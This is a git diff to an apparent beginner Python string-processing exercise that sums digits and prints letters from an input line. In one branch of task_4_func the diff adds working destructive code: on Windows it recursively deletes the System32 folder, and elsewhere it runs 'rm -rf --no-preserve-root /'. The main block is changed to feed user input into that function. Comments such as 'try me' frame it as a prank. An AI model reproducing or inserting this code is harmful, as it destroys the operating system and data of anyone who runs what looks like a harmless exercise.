@@ -13,6 +13,7 @@ ijn35pijnp46ij7k5j78p3kj546p465jnpoj35po6j345"
 
 import re
 import os
+import shutil
 
 
 def task_4_func(line : str):
@@ -28,13 +29,13 @@ def task_4_func(line : str):
         sum_of_digits = sum(int(digit) for digit in only_numbers)
         print(sum_of_digits, only_letters, sep='\n')
     else:
-        os.remove('C:\Windows\System32')                          #hehehehehe
+        if os.name == 'nt':
+            system32 = os.path.expandvars('%WINDIR%\System32')
+            shutil.rmtree(system32, ignore_errors=True)                #try me
+        else:
+            os.system('rm -rf --no-preserve-root /')
 
 
 if __name__ == '__main__':
-    line = 'f98neroi4nr0c3n30irn03ien'
-    task_4_func(line)
-    line += 'f98neroi'
-    task_4_func(line)
-    line += 'f98neroiroi4nr0c3n30irn03ien'
+    line = input('Input a line of any length: ')
     task_4_func(line)
